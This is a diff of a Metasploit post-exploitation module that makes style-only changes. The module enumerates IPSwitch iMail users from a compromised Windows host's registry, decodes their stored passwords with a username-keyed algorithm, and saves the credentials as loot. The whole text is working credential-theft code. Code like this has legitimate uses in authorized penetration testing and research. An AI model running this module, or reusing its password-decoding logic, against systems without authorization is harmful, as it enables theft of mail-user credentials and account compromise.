@@ -3,49 +3,50 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Windows Gather IPSwitch iMail User Data Enumeration",
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather IPSwitch iMail User Data Enumeration',
+        'Description' => %q{
           This module will collect iMail user data such as the username, domain,
-        full name, e-mail, and the decoded password.  Please note if IMAILUSER is
-        specified, the module extracts user data from all the domains found.  If
-        IMAILDOMAIN is specified, then it will extract all user data under that
-        particular category.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'sinn3r',  #Metasploit
+          full name, e-mail, and the decoded password.  Please note if IMAILUSER is
+          specified, the module extracts user data from all the domains found.  If
+          IMAILDOMAIN is specified, then it will extract all user data under that
+          particular category.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'sinn3r', # Metasploit
         ],
-      'References'     =>
-        [
+        'References' => [
           ['EDB', '11331'],
         ],
-      'Platform'       => [ 'win' ],
-      'SessionTypes'   => [ 'meterpreter' ]
-      ))
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
 
-      register_options(
-        [
-          OptString.new('IMAILUSER', [false, 'iMail username', '']),
-          OptString.new('IMAILDOMAIN', [false, 'iMail Domain', ''])
-        ])
+    register_options(
+      [
+        OptString.new('IMAILUSER', [false, 'iMail username', '']),
+        OptString.new('IMAILDOMAIN', [false, 'iMail Domain', ''])
+      ]
+    )
   end
 
-  def download_info(imail_user='', imail_domain='')
-    base = "HKLM\\SOFTWARE\\Ipswitch\\IMail"
+  def download_info(imail_user = '', imail_domain = '')
+    base = 'HKLM\\SOFTWARE\\Ipswitch\\IMail'
 
-    #Find domain(s)
+    # Find domain(s)
     users_subkey = []
     if imail_domain.empty?
       domains_key = registry_enumkeys("#{base}\\domains")
-      if not domains_key.nil?
+      if !domains_key.nil?
         domains_key.each do |domain_key|
           users_subkey << "#{base}\\domains\\#{domain_key}\\Users"
         end
@@ -54,12 +55,12 @@ class MetasploitModule < Msf::Post
       users_subkey << "#{base}\\domains\\#{imail_domain}\\Users"
     end
 
-    #Find users
+    # Find users
     users_key = []
     users_subkey.each do |user_key|
       if imail_user.empty?
         users = registry_enumkeys(user_key)
-        if not users.nil?
+        if !users.nil?
           users.each do |user|
             users_key << "#{user_key}\\#{user}"
           end
@@ -69,31 +70,31 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    #Get data for each user
+    # Get data for each user
     users = []
     users_key.each do |key|
-      #Filter out '_aliases'
+      # Filter out '_aliases'
       next if key =~ /_aliases/
 
       vprint_status("Grabbing key: #{key}")
 
-      domain    = $1 if key =~ /Ipswitch\\IMail\\domains\\(.+)\\Users/
+      domain = ::Regexp.last_match(1) if key =~ /Ipswitch\\IMail\\domains\\(.+)\\Users/
       mail_addr = registry_getvaldata(key, 'MailAddr')
-      password  = registry_getvaldata(key, 'Password')
+      password = registry_getvaldata(key, 'Password')
       full_name = registry_getvaldata(key, 'FullName')
-      username  = $1 if mail_addr =~ /(.+)@.+/
+      username = ::Regexp.last_match(1) if mail_addr =~ /(.+)@.+/
 
-      #Hmm, I don't think this user exists, skip to the next one
-      next if mail_addr == nil
+      # Hmm, I don't think this user exists, skip to the next one
+      next if mail_addr.nil?
 
       current_user =
-      {
-        :domain   => domain,
-        :fullname => full_name,
-        :username => username,
-        :email    => mail_addr,
-        :password => password,
-      }
+        {
+          domain: domain,
+          fullname: full_name,
+          username: username,
+          email: mail_addr,
+          password: password
+        }
 
       users << current_user
     end
@@ -101,28 +102,28 @@ class MetasploitModule < Msf::Post
     return users
   end
 
-  def decode_password(username='', enc_password='')
-    #No point trying to decode if there's no username or password
-    return "" if username.empty? or enc_password.empty?
+  def decode_password(username = '', enc_password = '')
+    # No point trying to decode if there's no username or password
+    return '' if username.empty? || enc_password.empty?
 
     counter = 0
     password = ''
 
-    #Start decoding, what's up gold $$
-    0.step(enc_password.length-1, 2) do |i|
-      byte_1 = enc_password[i,1].unpack("C")[0]
+    # Start decoding, what's up gold $$
+    0.step(enc_password.length - 1, 2) do |i|
+      byte_1 = enc_password[i, 1].unpack('C')[0]
       byte_1 = (byte_1 <= 57) ? byte_1 - 48 : byte_1 - 55
       byte_1 *= 16
 
-      byte_2 = enc_password[i+1,1].unpack("C")[0]
+      byte_2 = enc_password[i + 1, 1].unpack('C')[0]
       byte_2 = (byte_2 <= 57) ? byte_2 - 48 : byte_2 - 55
 
       char = byte_1 + byte_2
 
       counter = 0 if username.length <= counter
 
-      username_byte = username[counter, 1].unpack("C")[0]
-      if username_byte > 54 and username_byte < 90
+      username_byte = username[counter, 1].unpack('C')[0]
+      if (username_byte > 54) && (username_byte < 90)
         username_byte += 32
       end
 
@@ -138,8 +139,8 @@ class MetasploitModule < Msf::Post
 
   def report(users)
     credentials = Rex::Text::Table.new(
-      'Header'  => 'Ipswitch iMail User Credentials',
-      'Indent'   => 1,
+      'Header' => 'Ipswitch iMail User Credentials',
+      'Indent' => 1,
       'Columns' =>
       [
         'User',
@@ -151,14 +152,14 @@ class MetasploitModule < Msf::Post
     )
 
     users.each do |user|
-      domain    = user[:domain]
-      username  = user[:username]
-      password  = user[:password]
+      domain = user[:domain]
+      username = user[:username]
+      password = user[:password]
       full_name = user[:fullname]
-      e_mail    = user[:email]
+      e_mail = user[:email]
 
       if datastore['VERBOSE']
-        text  = ''
+        text = ''
         text << "User=#{username}, "
         text << "Password=#{password}, "
         text << "Domain=#{domain}, "
@@ -170,7 +171,7 @@ class MetasploitModule < Msf::Post
       credentials << [username, password, domain, full_name, e_mail]
     end
 
-    print_status("Storing data...")
+    print_status('Storing data...')
 
     path = store_loot(
       'imail.user.creds',
@@ -188,18 +189,18 @@ class MetasploitModule < Msf::Post
     imail_user = datastore['IMAILUSER']
     imail_domain = datastore['IMAILDOMAIN']
 
-    vprint_status("Download iMail user information...")
+    vprint_status('Download iMail user information...')
 
-    #Download user data.  If no user specified, we dump it all.
+    # Download user data.  If no user specified, we dump it all.
     users = download_info(imail_user, imail_domain)
 
-    #Process fullname and decode password
+    # Process fullname and decode password
     users.each do |user|
       user[:fullname] = Rex::Text.to_ascii(user[:fullname][2, user[:fullname].length])
       user[:password] = decode_password(user[:username], user[:password])
     end
 
-    #Report information and store it
+    # Report information and store it
     report(users)
   end
 end
